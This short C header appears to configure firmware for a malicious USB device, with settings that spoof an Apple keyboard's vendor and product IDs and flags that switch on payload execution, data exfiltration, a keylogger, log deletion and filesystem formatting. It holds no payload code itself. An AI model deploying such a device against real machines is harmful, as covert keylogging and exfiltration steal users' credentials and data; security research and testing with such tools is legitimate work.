#ifndef CONFIG
#define CONFIG

// USB CONFIG - CHANGE VID/PID/MANUFACTURER/PRODUCT - SET "#define CHANGE_USB_CONFIG true" TO APPLY
uint16_t vendor_id = 0x05ac;
uint16_t product_id = 0x201e;
const char *manufacturer = "Apple Inc.";
const char *product = "Aluminium Keyboard IT USB";

#define CHANGE_USB_CONFIG false // SET TRUE TO CHANGE VID/PID/MANUFACTURER/PRODUCT TO APPLE KEYBOARD

// ATTACK CONFIG (DISABLE ALL LOG OPTIONS: false)
#define PAYLOAD_RUN true // true or false
#define EXFIL false // true or false
#define KEYLOGGER true // true or false

// LOGS CONFIG (DISABLE ALL ATTACK OPTIONS: false)
#define EXFIL_VIEWLOG false // true or false
#define EXFIL_DELETELOG false // true or false
#define KEYLOGGER_VIEWLOG false // true or false
#define KEYLOGGER_DELETELOG false // true or false

// FORMAT FS
#define FORMATFS false
#endif

